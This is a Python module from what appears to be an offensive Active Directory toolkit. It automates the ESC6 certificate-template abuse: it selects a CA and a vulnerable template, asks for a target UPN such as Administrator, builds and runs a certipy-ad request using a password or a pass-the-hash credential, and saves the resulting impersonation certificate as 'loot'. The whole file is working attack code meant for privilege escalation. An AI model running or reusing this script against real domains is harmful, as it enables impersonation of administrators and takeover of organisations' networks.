import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc6(session, template=None):
    print(blue("[>] ESC6: Abusing SAN override in certificate template to request a certificate for any UPN."))
    print(yellow("[*] This abuse lets you impersonate a privileged user by supplying their UPN in the request."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(yellow("[!] No CA data found in session. Using fallback 'UNKNOWN-CA'."))
        ca_name = "UNKNOWN-CA"
    else:
        ca_name = cas[0].get("name", "").strip()
        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
            print(yellow("[!] CA name is missing or invalid. Using fallback 'UNKNOWN-CA'."))
            ca_name = "UNKNOWN-CA"

    # === Handle missing or fallback template
    if not template:
        print(yellow("[!] No template specified. Trying to auto-select ESC6 template..."))
        esc6_templates = [t["name"] for t in session.adcs_metadata.get("templates", []) if "ESC6" in t.get("vulns", [])]
        if esc6_templates:
            template = esc6_templates[0]
            print(green(f"[+] Using detected ESC6 template: {template}"))
        else:
            print(red("[-] No ESC6 templates found in metadata."))
            template = input("[?] Enter vulnerable template name manually: ").strip()
            if not template:
                print(red("[-] No template provided. Aborting."))
                return

    target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
    if not target_upn or "@" not in target_upn:
        print(red("[-] Invalid UPN format."))
        return

    output_file = f"esc6_{target_upn.split('@')[0]}.pfx"

    if session.hash:
        auth = f"-u {session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"-u {session.username} -p '{session.password}'"
    else:
        print(red("[-] No valid authentication method provided."))
        return

    cmd = (
        f"certipy-ad req {auth} -dc-ip {session.dc_ip} -ca '{ca_name}' "
        f"-template '{template}' -upn '{target_upn}' -out {output_file}"
    )

    print(blue(f"[*] Requesting certificate impersonating {target_upn} using template '{template}'..."))
    out, err = run_command(cmd)
    print(out.strip() or err.strip())

    print(yellow("[!] If the PFX file was not created or saved, retry the attack. It could be a connection issue."))
    print(green(f"[+] Expected PFX output: loot/{output_file}"))
    print(yellow(f"[*] Command executed: {cmd}"))
